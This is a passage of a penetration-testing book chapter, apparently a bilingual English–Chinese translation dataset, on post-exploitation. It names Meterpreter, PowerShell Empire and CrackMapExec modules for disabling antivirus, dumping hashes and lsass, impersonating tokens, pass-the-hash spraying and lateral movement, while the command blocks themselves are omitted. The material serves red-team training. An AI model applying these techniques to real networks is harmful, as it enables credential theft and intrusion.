- en: '| `run post/windows/manage/inject_host` | Allows the attacker to add entries
    to the Windows `HOSTS` file. This can divert traffic to a different site (a fake
    site), which will download additional tools or ensure that the antivirus software
    cannot connect to the internet or a local server to obtain signature updates.
    |'
  id: totrans-104
  prefs: []
  type: TYPE_TB
  zh: '| `run post/windows/manage/inject_host` | 允许攻击者向Windows的`HOSTS`文件中添加条目。这可以将流量重定向到一个不同的网站（假冒网站），以下载额外的工具，或者确保杀毒软件无法连接到互联网或本地服务器以获取签名更新。
    |'
- en: '| `run post/windows/gather/cachedump` | Dumps all of the cached information
    that can be further utilized to exfiltrate data. |'
  id: totrans-105
  prefs: []
  type: TYPE_TB
  zh: '| `run post/windows/gather/cachedump` | 导出所有缓存信息，可进一步用于数据外泄。 |'
- en: '| `run use post/windows/manage/killav` | Disables most of the antivirus services
    running on the compromised system. This script is frequently out of date, and
    success should be manually verified. |'
  id: totrans-106
  prefs: []
  type: TYPE_TB
  zh: '| `run use post/windows/manage/killav` | 禁用大多数在受攻击系统上运行的杀毒服务。此脚本常常过时，成功执行需手动验证。
    |'
- en: '| `run winenum` | Performs a command-line and WMIC characterization of the
    exploited system. It dumps the important keys from the registry and LM hashes.
    |'
  id: totrans-107
  prefs: []
  type: TYPE_TB
  zh: '| `run winenum` | 执行命令行和WMIC的系统特征分析。它导出注册表中的重要键和LM哈希。 |'
- en: '| `run scraper` | Gathers comprehensive information that has not been gathered
    by other scripts, such as the entire Windows registry. |'
  id: totrans-108
  prefs: []
  type: TYPE_TB
  zh: '| `run scraper` | 收集其他脚本未收集的全面信息，如整个Windows注册表。 |'
- en: '| `run upload` and `run download` | Allows the attacker to upload and download
    files onto the target system. |'
  id: totrans-109
  prefs: []
  type: TYPE_TB
  zh: '| `run upload` 和 `run download` | 允许攻击者向目标系统上传和下载文件。 |'
- en: 'Table 11.4: Meterpreter post-exploit modules'
  id: totrans-110
  prefs: []
  type: TYPE_NORMAL
  zh: 表11.4：Meterpreter后期利用模块
- en: 'Let’s look at an example. Here, we will run `winenum` on the compromised system,
    which dumps all the important registry keys and LM hashes for lateral movement
    and privilege escalation. This can be accomplished by running `run winenum` on
    the Meterpreter shell. You should see the confirmation `All tokens have been processed`,
    as shown in *Figure 11.4*:'
  id: totrans-111
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们来看一个例子。在这里，我们将在被攻击的系统上运行`winenum`，该工具会导出所有重要的注册表键和LM哈希，用于横向移动和权限提升。这可以通过在Meterpreter命令行中运行`run
    winenum`来实现。你应该看到确认信息`All tokens have been processed`，如*图11.4*所示：
- en: '![](../Images/B17765_11_04.png)'
  id: totrans-112
  prefs: []
  type: TYPE_IMG
  zh: '![](../Images/B17765_11_04.png)'
- en: 'Figure 11.4: Running Meterpreter Windows enumeration'
  id: totrans-113
  prefs: []
  type: TYPE_NORMAL
  zh: 图 11.4：运行 Meterpreter Windows 枚举
- en: 'All the individual findings will be stored in the `/root/.msf4/logs/scripts/winenum`
    folder. Attackers will be able to view the contents with the details as seen in
    *Figure 11.5*:'
  id: totrans-114
  prefs: []
  type: TYPE_NORMAL
  zh: 所有单独的发现将保存在 `/root/.msf4/logs/scripts/winenum` 文件夹中。攻击者可以查看该文件夹中的详细内容，如 *图 11.5*
    所示：
- en: '![](../Images/B17765_11_05.png)'
  id: totrans-115
  prefs: []
  type: TYPE_IMG
  zh: '![](../Images/B17765_11_05.png)'
- en: 'Figure 11.5: Windows enumeration script output from Meterpreter script'
  id: totrans-116
  prefs: []
  type: TYPE_NORMAL
  zh: 图 11.5：Meterpreter 脚本输出的 Windows 枚举结果
- en: One of the other things attackers can do is impersonate the session tokens by
    using Meterpreter and utilizing the incognito module. Initially, a standalone
    module was created to impersonate a user by using the session tokens. These are
    similar to web session cookies in that they can identify the user without having
    to ask for their username and password every time. Similarly, the same situation
    applies to the computer and network.
  id: totrans-117
  prefs: []
  type: TYPE_NORMAL
  zh: 攻击者可以做的另一件事是使用 Meterpreter 冒充会话令牌，并利用隐身模块。最初，创建了一个独立模块，通过会话令牌来冒充用户。这些令牌类似于 web
    会话 cookie，能够在无需每次询问用户名和密码的情况下识别用户。同样的情况也适用于计算机和网络。
- en: 'Attackers can run incognito in Meterpreter by running `use incognito` in the
    Meterpreter shell, as shown in *Figure 11.6*:'
  id: totrans-118
  prefs: []
  type: TYPE_NORMAL
  zh: 攻击者可以通过在 Meterpreter shell 中运行 `use incognito` 来以隐身模式运行 Meterpreter，如 *图 11.6*
    所示：
- en: '![](../Images/B17765_11_06.png)'
  id: totrans-119
  prefs: []
  type: TYPE_IMG
  zh: '![](../Images/B17765_11_06.png)'
- en: 'Figure 11.6: Listing all the tokens available'
  id: totrans-120
  prefs: []
  type: TYPE_NORMAL
  zh: 图 11.6：列出所有可用的令牌
- en: For example, if the Meterpreter shell is pawned by a local user, by impersonating
    the user token as system user `NT Authority`, a normal user can enjoy the privilege
    of a system user.
  id: totrans-121
  prefs: []
  type: TYPE_NORMAL
  zh: 例如，如果 Meterpreter shell 被本地用户攻破，通过将用户令牌冒充为系统用户 `NT Authority`，普通用户也能享受系统用户的权限。
- en: 'To run the impersonation, attackers can run `impersonate_token` from the Meterpreter
    shell, as shown in *Figure 11.7*:'
  id: totrans-122
  prefs: []
  type: TYPE_NORMAL
  zh: 要执行冒充，攻击者可以从 Meterpreter shell 中运行 `impersonate_token`，如 *图 11.7* 所示：
- en: '![](../Images/B17765_11_07.png)'
  id: totrans-123
  prefs: []
  type: TYPE_IMG
  zh: '![](../Images/B17765_11_07.png)'
- en: 'Figure 11.7: Utilizing the token impersonation using Meterpreter'
  id: totrans-124
  prefs: []
  type: TYPE_NORMAL
  zh: 图 11.7：使用 Meterpreter 利用令牌冒充
- en: The PowerShell Empire project
  id: totrans-125
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: PowerShell Empire 项目
- en: In the last chapter, we have learned about the PowerShell Empire framework and
    how to create a stager to launch the attack. Attackers can save the PowerShell
    output from the stager into a `.ps1` file. In this section, we will go ahead and
    run the stager on our target.
  id: totrans-126
  prefs: []
  type: TYPE_NORMAL
  zh: 在上一章中，我们了解了 PowerShell Empire 框架以及如何创建启动器来发起攻击。攻击者可以将启动器的 PowerShell 输出保存到 `.ps1`
    文件中。在本节中，我们将继续在目标上运行启动器。
- en: 'To get the systems to become their agents, attackers can utilize their existing
    Meterpreter session to run the PowerShell, along with the payload generated by
    the Empire tool, as shown in *Figure 11.8*:'
  id: totrans-127
  prefs: []
  type: TYPE_NORMAL
  zh: 为了让系统成为他们的代理，攻击者可以利用现有的 Meterpreter 会话来运行 PowerShell，并结合 Empire 工具生成的有效载荷，如
    *图 11.8* 所示：
- en: '![](../Images/B17765_11_08.png)'
  id: totrans-128
  prefs: []
  type: TYPE_IMG
  zh: '![](../Images/B17765_11_08.png)'
- en: 'Figure 11.8: Running PowerShell from the compromised machine'
  id: totrans-129
  prefs: []
  type: TYPE_NORMAL
  zh: 图 11.8：从被攻破的机器运行 PowerShell
- en: 'Once the payload is run on the remote system, our Empire tool interface must
    show the following:'
  id: totrans-130
  prefs: []
  type: TYPE_NORMAL
  zh: 一旦有效载荷在远程系统上运行，我们的 Empire 工具界面必须显示以下内容：
- en: '![](../Images/B17765_11_09.png)'
  id: totrans-131
  prefs: []
  type: TYPE_IMG
  zh: '![](../Images/B17765_11_09.png)'
- en: 'Figure 11.9: Successful execution of the PowerShell script on the target reports
    to Empire'
  id: totrans-132
  prefs: []
  type: TYPE_NORMAL
  zh: 图 11.9：PowerShell 脚本在目标机器上成功执行并向 Empire 汇报
- en: 'To interact with an agent, you must type `agents` to list all the agents that
    are connected to you, as well as `interact "name of the agent"`. You can run the
    `system level` command from our HTTP listener to the agent, as shown in *Figure
    11.10*:'
  id: totrans-133
  prefs: []
  type: TYPE_NORMAL
  zh: 要与代理交互，你必须输入 `agents` 列出所有连接到你的代理，以及输入 `interact "代理名称"`。你可以通过我们的 HTTP 监听器向代理运行
    `system level` 命令，如 *图 11.10* 所示：
- en: '![](../Images/B17765_11_10.png)'
  id: totrans-134
  prefs: []
  type: TYPE_IMG
  zh: '![](../Images/B17765_11_10.png)'
- en: 'Figure 11.10: Running shell commands on the remote server using PowerShell
    Empire'
  id: totrans-135
  prefs: []
  type: TYPE_NORMAL
  zh: 图 11.10：使用 PowerShell Empire 在远程服务器上运行 shell 命令
- en: CrackMapExec
  id: totrans-136
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: CrackMapExec
- en: '**CrackMapExec** (**CME**) is another post-exploitation tool that helps automate
    assessing the security of large Active Directory networks. Built with stealth
    in mind, CME follows the concept of *living off the land*: abusing built-in Active
    Directory features/protocols to achieve its functionality and allowing it to evade
    most endpoint protection/IDS/IPS solutions.'
  id: totrans-137
  prefs: []
  type: TYPE_NORMAL
  zh: '**CrackMapExec** (**CME**) 是另一种后期利用工具，帮助自动化评估大型 Active Directory 网络的安全性。CME
    的设计考虑到隐匿性，遵循 *利用现有资源（living off the land）* 的概念：滥用内置的 Active Directory 功能/协议来实现其功能，从而能够避开大多数端点保护/IDS/IPS
    解决方案。'
- en: 'CME makes heavy use of the Impacket library and PowerSploit for working with
    network protocols and performing a variety of post-exploitation techniques. CME
    is installed by default in Kali Linux; you should be able to list all of the modules
    in the tool by running `crackmapexec service -L`, as shown in *Figure 11.11*:'
  id: totrans-138
  prefs: []
  type: TYPE_NORMAL
  zh: CME 重度使用 Impacket 库和 PowerSploit 来处理网络协议并执行各种后渗透技术。CME 默认安装在 Kali Linux 中；你可以通过运行
    `crackmapexec service -L` 来列出该工具中的所有模块，如 *图 11.11* 所示：
- en: '![](../Images/B17765_11_11.png)'
  id: totrans-139
  prefs: []
  type: TYPE_IMG
  zh: '![](../Images/B17765_11_11.png)'
- en: 'Figure 11.11: CrackMapExec SMB modules'
  id: totrans-140
  prefs: []
  type: TYPE_NORMAL
  zh: 图 11.11：CrackMapExec SMB 模块
- en: 'This tool works for the objective that has been set during a red team or pentest.
    CME can be briefly divided into three parts: protocols, modules, and databases:'
  id: totrans-141
  prefs: []
  type: TYPE_NORMAL
  zh: 该工具适用于红队或渗透测试期间设定的目标。CME 可以简要地分为三个部分：协议、模块和数据库：
- en: '**Protocols**: CME supports SMB, MSSQL, LDAP, WINRM, and SSH. These are protocols
    that are commonly used in most organizations.'
  id: totrans-142
  prefs: []
  type: TYPE_NORMAL
  zh: '**协议**：CME 支持 SMB、MSSQL、LDAP、WINRM 和 SSH。这些是大多数组织中常用的协议。'
- en: '**Modules**: *Table 11.5* provides a list of SMB modules that are important
    and handy while using CME. However, the modules aren’t limited to this list; testers
    can also utilize third-party plugins or write their own PowerShell script and
    invoke them using CME:'
  id: totrans-143
  prefs: []
  type: TYPE_NORMAL
  zh: '**模块**：*表 11.5* 提供了使用 CME 时非常重要且实用的 SMB 模块列表。然而，这些模块并不限于此列表；测试人员还可以使用第三方插件或编写自己的
    PowerShell 脚本，并通过 CME 调用它们：'
- en: '| **Module Name** | **Description** |'
  id: totrans-144
  prefs: []
  type: TYPE_TB
  zh: '| **模块名称** | **描述** |'
- en: '| `empire_exec` | This will launch the Empire RESTful API and generate a launcher
    for the specific listener before executing on the target. |'
  id: totrans-145
  prefs: []
  type: TYPE_TB
  zh: '| `empire_exec` | 该功能将启动 Empire RESTful API，并在执行目标操作之前为特定的监听器生成启动器。 |'
- en: '| `Shellcode_inject` | Utilizes PowerSploit’s `Invoke-Shellcode.ps1` script
    to inject the shellcode into memory and downloads the specified raw shellcode.
    |'
  id: totrans-146
  prefs: []
  type: TYPE_TB
  zh: '| `Shellcode_inject` | 利用 PowerSploit 的 `Invoke-Shellcode.ps1` 脚本将 shellcode
    注入内存，并下载指定的原始 shellcode。 |'
- en: '| `mimikittenz` | If `mimikatz` is being blocked, you can utilize `mimikittenz`.
    This module will enable the testers to extract the credentials from memory without
    having to download another payload. |'
  id: totrans-147
  prefs: []
  type: TYPE_TB
  zh: '| `mimikittenz` | 如果 `mimikatz` 被阻止，可以使用 `mimikittenz`。该模块允许测试人员从内存中提取凭证，而无需下载另一个有效载荷。
    |'
- en: '| `com_exec` | Uses COM scriptlets to bypass application whitelisting. |'
  id: totrans-148
  prefs: []
  type: TYPE_TB
  zh: '| `com_exec` | 使用 COM 脚本小程序绕过应用程序白名单。 |'
- en: '| `Mimikatz_enum_chrome` | Utilizes PowerSploit’s `Invoke-Mimikatz.ps1` script
    to decrypt saved passwords in Google Chrome. |'
  id: totrans-149
  prefs: []
  type: TYPE_TB
  zh: '| `Mimikatz_enum_chrome` | 利用 PowerSploit 的 `Invoke-Mimikatz.ps1` 脚本解密 Google
    Chrome 中保存的密码。 |'
- en: '| `tokens` | Utilizes PowerSploit’s `Invoke-TokenManipulation` script to extract
    tokens. |'
  id: totrans-150
  prefs: []
  type: TYPE_TB
  zh: '| `tokens` | 利用 PowerSploit 的 `Invoke-TokenManipulation` 脚本提取令牌。 |'
- en: '| `mimikatz` | Utilizes PowerSploit’s `Invoke-Mimikatz.ps1` script to dump
    the passwords into plaintext. |'
  id: totrans-151
  prefs: []
  type: TYPE_TB
  zh: '| `mimikatz` | 利用 PowerSploit 的 `Invoke-Mimikatz.ps1` 脚本将密码转储为明文。 |'
- en: '| `Pe_inject` | This utilizes PowerSploit’s `Invoke-ReflectivePEInjection.ps1`
    script to inject the script into memory by downloading the specified DLL/EXE.
    |'
  id: totrans-152
  prefs: []
  type: TYPE_TB
  zh: '| `Pe_inject` | 该功能利用 PowerSploit 的 `Invoke-ReflectivePEInjection.ps1` 脚本，通过下载指定的
    DLL/EXE 将脚本注入内存。 |'
- en: '| `lsassy` | A very interesting payload that allows you to dump the `lsass.exe`
    and send the results remotely. |'
  id: totrans-153
  prefs: []
  type: TYPE_TB
  zh: '| `lsassy` | 一个非常有趣的有效载荷，允许你转储 `lsass.exe` 并远程发送结果。 |'
- en: '| `wireless` | Downloads all the wireless keys in plaintext specific to the
    interfaces configured on the target. |'
  id: totrans-154
  prefs: []
  type: TYPE_TB
  zh: '| `wireless` | 下载目标配置接口的所有无线密钥（明文）。 |'
- en: '| `rdp` | Allows the testers to enable/disable remote desktop protocol. |'
  id: totrans-155
  prefs: []
  type: TYPE_TB
  zh: '| `rdp` | 允许测试人员启用/禁用远程桌面协议。 |'
- en: 'Table 11.5: CrackMapExec modules'
  id: totrans-156
  prefs: []
  type: TYPE_NORMAL
  zh: 表 11.5：CrackMapExec 模块
- en: '**Databases**: `cmedb` is the database that stores the host and its credential
    details, which are harvested after the exploitation. *Figure 11.12* shows a sample
    of some details:'
  id: totrans-157
  prefs: []
  type: TYPE_NORMAL
  zh: '**数据库**：`cmedb` 是一个数据库，用于存储主机及其凭证详细信息，这些信息是在利用攻击后收集的。*图 11.12* 显示了一些详细信息的示例：'
- en: '![](../Images/B17765_11_12.png)'
  id: totrans-158
  prefs: []
  type: TYPE_IMG
  zh: '![](../Images/B17765_11_12.png)'
- en: 'Figure 11.12: cmedb storing the exploited hosts and credentials'
  id: totrans-159
  prefs: []
  type: TYPE_NORMAL
  zh: 图 11.12：cmedb 存储被利用的主机和凭证
- en: 'As an example, we will use the hashdump that we acquired from the compromised
    system to run the `ipconfig` command, as shown in the following code:'
  id: totrans-160
  prefs: []
  type: TYPE_NORMAL
  zh: 例如，我们将使用从被攻陷系统中获取的 hashdump 来运行 `ipconfig` 命令，如下代码所示：
- en: '[PRE2]'
  id: totrans-161
  prefs: []
  type: TYPE_PRE
  zh: '[PRE2]'
- en: '*Figure 11.13* shows the validity of the credentials by passing the hash successfully
    and running the `ipconfig` command on the target:'
  id: totrans-162
  prefs: []
  type: TYPE_NORMAL
  zh: '*图 11.13* 显示了通过成功传递哈希并在目标上运行 `ipconfig` 命令来验证凭证的有效性：'
- en: '![](../Images/B17765_11_13.png)'
  id: totrans-163
  prefs: []
  type: TYPE_IMG
  zh: '![](../Images/B17765_11_13.png)'
- en: 'Figure 11.13: Running command on the target using crackmapexec'
  id: totrans-164
  prefs: []
  type: TYPE_NORMAL
  zh: 图 11.13：使用 crackmapexec 在目标上运行命令
- en: Horizontal escalation and lateral movement
  id: totrans-165
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 水平升级和横向渗透
- en: In horizontal escalation, the attacker retains their existing credentials but
    uses them to act on a different user’s account. For example, a user on compromised
    system A attacks a user on system B in an attempt to compromise them.
  id: totrans-166
  prefs: []
  type: TYPE_NORMAL
  zh: 在水平升级中，攻击者保留现有的凭据，但利用这些凭据在不同用户的账户上进行操作。例如，系统 A 上的用户攻击系统 B 上的用户，试图攻破其账户。
- en: The horizontal move that attackers would utilize is from the compromised system.
  id: totrans-167
  prefs: []
  type: TYPE_NORMAL
  zh: 攻击者通常利用被攻破的系统进行横向渗透。
- en: 'This is used to extract the hashes of common usernames such as Itsupport and
    LocalAdministrators, or known default user administrators to escalate the privileges
    horizontally on all the available systems that are connected to the same domain.
    For example, here, we will use CME to run the same password hashes across an IP
    range to dump all of the passwords on a hacker-controlled shared drive:'
  id: totrans-168
  prefs: []
  type: TYPE_NORMAL
  zh: 这用于提取常见用户名的哈希值，如 Itsupport 和 LocalAdministrators，或者已知的默认用户管理员，从而在所有连接到同一域的可用系统上横向提升权限。例如，在这里，我们将使用
    CME 在一个 IP 范围内运行相同的密码哈希，以便在黑客控制的共享驱动器上转储所有密码：
- en: '[PRE3]'
  id: totrans-169
  prefs: []
  type: TYPE_PRE
  zh: '[PRE3]'
- en: '*Figure 11.14* shows the output of a SAM dump being run on an entire IP range
    to extract SAM password hashes without planting any executables or backdoors:'
  id: totrans-170
  prefs: []
  type: TYPE_NORMAL
  zh: '*图 11.14* 显示了在整个 IP 范围内运行 SAM 转储，以提取 SAM 密码哈希，而无需植入任何可执行文件或后门：'
- en: '![](../Images/B17765_11_14.png)'
  id: totrans-171
  prefs: []
  type: TYPE_IMG
  zh: '![](../Images/B17765_11_14.png)'
- en: 'Figure 11.14: Spraying password hashes across the network IP range'
  id: totrans-172
  prefs: []
  type: TYPE_NORMAL
  zh: 图 11.14：在网络 IP 范围内喷洒密码哈希
- en: In mature organizations, there may be a chance that this payload is blocked
    by endpoint protection or antivirus software, but that does not stop the hashdump
    if the user is a local administrator.
  id: totrans-173
  prefs: []
  type: TYPE_NORMAL
  zh: 在成熟的组织中，可能会遇到端点保护或杀毒软件阻止该载荷的情况，但如果用户是本地管理员，这并不会阻止哈希转储。
- en: Most of the time, we have been successful in using the same local administrator’s
    password hash to successfully log in to the domain’s Microsoft **SCCM** (**System
    Center Configuration Manager**) system. This manages software installation on
    all of the systems that are managed by any organization. It then performs the
    command and control from SCCM.
  id: totrans-174
  prefs: []
  type: TYPE_NORMAL
  zh: 大多数情况下，我们已经成功使用相同的本地管理员密码哈希登录到域的 Microsoft **SCCM**（**系统中心配置管理器**）系统。该系统用于管理所有由组织管理的系统上的软件安装。然后，它执行命令与控制操作。
- en: 'By running the following command, you can run `mimikatz` on the desired target
    with captured username and password hashes:'
  id: totrans-175
  prefs: []
  type: TYPE_NORMAL
  zh: 通过运行以下命令，您可以在目标上运行 `mimikatz`，并使用捕获的用户名和密码哈希：
- en: '[PRE4]'
  id: totrans-176
  prefs: []
  type: TYPE_PRE
  zh: '[PRE4]'
- en: '*Figure 11.15* shows the output of `mimikatz` being run on our victim system
    to extract passwords in plaintext without uploading any executables or planting
    any backdoors:'
  id: totrans-177
  prefs: []
  type: TYPE_NORMAL
  zh: '*图 11.15* 显示了在我们受害者系统上运行 `mimikatz` 的输出，提取明文密码，而无需上传任何可执行文件或植入后门：'
- en: '![](../Images/B17765_11_15.png)'
  id: totrans-178
  prefs: []
  type: TYPE_IMG
  zh: '![](../Images/B17765_11_15.png)'
- en: 'Figure 11.15: Running Mimikatz on the target using crackmapexec'
  id: totrans-179
  prefs: []
  type: TYPE_NORMAL
  zh: 图 11.15：使用 crackmapexec 在目标上运行 Mimikatz
- en: CME has excellent support so that you can pass the hash and invoke `mimikatz`
    directly from the module or invoke the Empire PowerShell to perform data exfiltration.
  id: totrans-180
  prefs: []
  type: TYPE_NORMAL
  zh: CME 具有出色的支持，使得你可以通过模块直接传递哈希值并调用 `mimikatz`，或者调用 Empire PowerShell 来执行数据外泄。
- en: Compromising domain trusts and shares
  id: totrans-181
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 攻破域信任关系和共享
- en: In this section, we will discuss the domain hierarchies that can be manipulated
    so that we can take advantage of the features that are being implemented on Active
    Directory.
  id: totrans-182
  prefs: []
  type: TYPE_NORMAL
  zh: 本节将讨论可以被操控的域层级结构，以便我们能够利用 Active Directory 上实施的功能。
- en: 'We will utilize the Empire tool to harvest all of the domain-level information
    and trust relationships between the systems. To understand the current situation
    of the system that is being compromised, attackers can now perform different types
    of queries by using the Empire tool. *Table 11.6* provides a list of the most
    effective modules that are typically used during an RTE/pentesting activity:'
  id: totrans-183
  prefs: []
  type: TYPE_NORMAL
  zh: 我们将利用 Empire 工具收集所有域级信息和系统之间的信任关系。为了了解被攻破系统的当前状况，攻击者现在可以使用 Empire 工具执行不同类型的查询。*表
    11.6* 提供了在 RTE/渗透测试活动中通常使用的最有效模块列表：
- en: '| **Module Name** | **Description** |'
  id: totrans-184
  prefs: []
  type: TYPE_TB
  zh: '| **模块名称** | **描述** |'
- en: '| `situational_awareness/network/sharefinder` | This module provides a list
    of network file shares on the given network. |'
  id: totrans-185
  prefs: []
  type: TYPE_TB
  zh: '| `situational_awareness/network/sharefinder` | 此模块提供给定网络上网络共享文件的列表。 |'
- en: '| `situational_awareness/network/arpscan` | Testers can perform an `arpscan`
    to the reachable IP v4 range. |'
  id: totrans-186
  prefs: []
  type: TYPE_TB
  zh: '| `situational_awareness/network/arpscan` | 测试人员可以对可达的IP v4范围执行`arpscan`。|'
- en: '| `situational_awareness/network/reverse_dns` | This module provides the reverse
    IP lookup and finds the DNS hostname. |'
  id: totrans-187
  prefs: []
  type: TYPE_TB
  zh: '| `situational_awareness/network/reverse_dns` | 此模块提供反向IP查找并查找DNS主机名。|'
- en: '| `situational_awareness/network/portscan` | Similar to `nmap`, you can use
    this module to perform host scans, but this is not stealthy. |'
  id: totrans-188
  prefs: []
  type: TYPE_TB
  zh: '| `situational_awareness/network/portscan` | 类似于`nmap`，你可以使用此模块执行主机扫描，但它并不隐蔽。|'
- en: '| `situational_awareness/network/netview` | This module helps attackers to
    enumerate shares, logged-on users, and sessions on a given domain. |'
  id: totrans-189
  prefs: []
  type: TYPE_TB
  zh: '| `situational_awareness/network/netview` | 此模块帮助攻击者枚举共享、已登录用户和给定域上的会话。|'
- en: '| `situational_awareness/network/userhunter``situational_awareness/network/stealth_userhunter`
    | Attackers use `userhunter` to identify how many more systems they can log into
    with the acquired credentials. Since this will hunt for the user, its sets are
    logged into a given network. |'
  id: totrans-190
  prefs: []
  type: TYPE_TB
  zh: '| `situational_awareness/network/userhunter``situational_awareness/network/stealth_userhunter`
    | 攻击者使用`userhunter`来识别他们可以使用已获得的凭据登录多少个系统。由于这是针对用户的扫描，因此它的集合会记录到给定的网络中。|'
- en: '| `situational_awareness/network/powerview/get_forest` | Successful execution
    of this module will return the forest details. |'
  id: totrans-191
  prefs: []
  type: TYPE_TB
  zh: '| `situational_awareness/network/powerview/get_forest` | 成功执行此模块将返回林的详细信息。|'
- en: '| `situational_awareness/network/get_exploitable_system` | Identifies the vulnerable
    systems on the network, providing an additional entry point. |'
  id: totrans-192
  prefs: []
  type: TYPE_TB
  zh: '| `situational_awareness/network/get_exploitable_system` | 识别网络中的易受攻击系统，提供额外的入口点。|'
- en: '| `situational_awareness/network/powerview/find_localadmin_access get_domain_controller
    get_forest_domain get_fileserver find_gpo_computer_admin` | All of these modules
    are used to harvest more details on the domain trusts, objects, and file servers.
    |'
  id: totrans-193
  prefs: []
  type: TYPE_TB
  zh: '| `situational_awareness/network/powerview/find_localadmin_access get_domain_controller
    get_forest_domain get_fileserver find_gpo_computer_admin` | 所有这些模块用于收集更多关于域信任、对象和文件服务器的详细信息。|'
- en: 'Table 11.6: PowerShell Empire modules for situational awareness'
  id: totrans-194
  prefs: []
  type: TYPE_NORMAL
  zh: 表11.6：PowerShell Empire模块用于情境感知
- en: In this example, we will use the `situational_awareness/network/powerview/get_forest`
    module to extract the forest details of a connected domain. The following commands
    are run in the PowerShell Empire terminal.
  id: totrans-195
  prefs: []
  type: TYPE_NORMAL
  zh: 在这个示例中，我们将使用`situational_awareness/network/powerview/get_forest`模块来提取已连接域的林详细信息。以下命令在PowerShell
    Empire终端中运行。
- en: 'A successful run of the modules should disclose the details that are shown
    in *Figure 11.16*:'
  id: totrans-196
  prefs: []
  type: TYPE_NORMAL
  zh: 模块成功运行后，应该会显示*图11.16*中的详细信息：
- en: '![](../Images/B17765_11_16.png)'
  id: totrans-197
  prefs: []
  type: TYPE_IMG
  zh: '![](../Images/B17765_11_16.png)'
- en: 'Figure 11.16: Running PowerShell Empire module to get forest details'
  id: totrans-198
  prefs: []
  type: TYPE_NORMAL
  zh: 图11.16：运行PowerShell Empire模块以获取林的详细信息
- en: In another example, the attacker will always locate systems that have `ADMIN$`
    and `C$` in them so that it can plant a backdoor or gather information. It can
    then use these credentials to run the commands remotely.
  id: totrans-199
  prefs: []
  type: TYPE_NORMAL
  zh: 在另一个示例中，攻击者总是会找到包含`ADMIN$`和`C$`的系统，以便植入后门或收集信息。然后它可以使用这些凭据远程运行命令。
- en: 'This can be achieved by using the `situational_awareness/network/powerview/share_finder`
    module, as shown in *Figure 11.17*:'
  id: totrans-200
  prefs: []
  type: TYPE_NORMAL
  zh: 这可以通过使用`situational_awareness/network/powerview/share_finder`模块来实现，如*图11.17*所示：
- en: '![](../Images/B17765_11_17.png)'
  id: totrans-201
  prefs: []
  type: TYPE_IMG
  zh: '![](../Images/B17765_11_17.png)'
- en: 'Figure 11.17: Identifying the shared drives across the Active Directory domain'
  id: totrans-202
  prefs: []
  type: TYPE_NORMAL
  zh: 图11.17：识别Active Directory域中的共享驱动器
- en: As the majority of pentesters do not check what’s inside the shared drives,
    sometimes they are surprised at the mistakes administrators make, such as allowing
    all the domain users to access the IT shared drives or even users’ home drives
    left unattended whereby the attackers can loot numerous passwords, without having
    to exploit a single vulnerability. During multiple red team activities, we have
    noticed employees storing passwords, including some banking information, in shared
    drives as plaintext.
  id: totrans-203
  prefs: []
  type: TYPE_NORMAL
  zh: 由于大多数渗透测试人员不会检查共享驱动器中的内容，有时他们会对管理员犯的错误感到惊讶，例如允许所有域用户访问IT共享驱动器，或者用户的家目录无人看管，攻击者可以在其中窃取大量密码，而不必利用任何单一漏洞。在多次红队活动中，我们注意到员工将密码（包括一些银行信息）以明文形式存储在共享驱动器中。
- en: PsExec, WMIC, and other tools
  id: totrans-204
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: PsExec、WMIC及其他工具
- en: PsExec is Microsoft’s replacement for Telnet and can be downloaded from [https://technet.microsoft.com/en-us/sysinternals/bb897553.aspx](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec).
  id: totrans-205
  prefs: []
  type: TYPE_NORMAL
  zh: PsExec是微软替代Telnet的工具，可以从[https://technet.microsoft.com/en-us/sysinternals/bb897553.aspx](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec)下载。
- en: 'Typically, the PsExec module is utilized by attackers to obtain access to and
    communicate with the remote system on the network with valid credentials:'
  id: totrans-206
  prefs: []
  type: TYPE_NORMAL
  zh: 通常，攻击者使用 PsExec 模块通过有效凭证获取访问权限，并与网络中的远程系统进行通信：
- en: '![](../Images/B17765_11_18.png)'
  id: totrans-207
  prefs: []
  type: TYPE_IMG
  zh: '![](../Images/B17765_11_18.png)'
- en: 'Figure 11.18: Gaining remote shell access using PSExec and valid credentials'
  id: totrans-208
  prefs: []
  type: TYPE_NORMAL
  zh: 图 11.18：使用 PSExec 和有效凭证获取远程 shell 访问
- en: Originally, the executable was designed for system internals to troubleshoot
    any issues with the framework. The same can now be utilized by running the PsExec
    Metasploit module and performing remote options. This will open up a shell; testers
    can either enter their username and password or just pass the hash values, so
    there is no need to crack the password hashes to gain access to the system. Now,
    all the lateral movement can be performed if a single system is compromised on
    the network without the need for a password.
  id: totrans-209
  prefs: []
  type: TYPE_NORMAL
  zh: 最初，该可执行文件是为系统内部工具设计的，用于排除框架中的问题。现在可以通过运行 PsExec Metasploit 模块并执行远程选项来利用它。这将打开一个
    shell；测试人员可以输入他们的用户名和密码，或者直接传递哈希值，因此无需破解密码哈希即可访问系统。如果网络中的单个系统被攻破，那么所有的横向移动操作都可以进行，而无需密码。
- en: '*Figure 11.19* shows the Metasploit module of PsExec with valid credentials:'
  id: totrans-210
  prefs: []
  type: TYPE_NORMAL
  zh: '*图 11.19* 显示了带有有效凭证的 PsExec Metasploit 模块：'
- en: '![](../Images/B17765_11_19.png)'
  id: totrans-211
  prefs: []
  type: TYPE_IMG
  zh: '![](../Images/B17765_11_19.png)'
- en: 'Figure 11.19: Metasploit module options to make use of PsExec with valid credentials'
  id: totrans-212
  prefs: []
  type: TYPE_NORMAL
  zh: 图 11.19：使用有效凭证的 Metasploit 模块选项以利用 PsExec
- en: WMIC
  id: totrans-213
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: WMIC
- en: 'On newer systems, attackers and penetration testers take advantage of built-in
    scripting languages, such as the **Windows Management Instrumentation Command
    Line** (**WMIC**), a command-line and scripting interface that is used to simplify
    access to Windows Management Instrumentation. If the compromised system supports
    WMIC, several commands can be used to gather information. *Table 11.7* provides
    a brief description of some of the commands:'
  id: totrans-214
  prefs: []
  type: TYPE_NORMAL
  zh: 在较新的系统中，攻击者和渗透测试人员利用内置脚本语言，如 **Windows Management Instrumentation Command Line**
